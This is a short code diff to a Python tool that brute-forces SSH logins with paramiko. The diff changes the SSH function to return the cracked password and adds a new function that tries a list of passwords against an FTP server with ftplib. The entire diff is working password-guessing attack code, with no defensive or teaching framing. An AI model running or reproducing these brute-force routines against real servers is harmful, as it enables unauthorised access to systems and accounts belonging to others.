@@ -1,7 +1,5 @@
-import logging
-from src.config import MESSAGES
 import paramiko
-
+import ftplib
 
 
 
@@ -14,10 +12,23 @@ def bruteforce_ssh(adress, port, username, wordlist, threads, noi):
         password = password_list[i].split('\n')[0]
         try:
             client.connect(hostname=adress, port=port, username=username, password=password)
-            logging.info(f'{MESSAGES["password_found"]}{password}')
+            return password
             exit()
         except:
             pass
 
-    # close the SSH client
     client.close()
+    return None
+
+
+
+
+def ftpbruteforce(hostname, username, passwords):
+    for password in passwords:
+        try:
+            ftp = ftplib.FTP(hostname)
+            ftp.login(username, password)
+            return password
+        except:
+            continue
+    return None
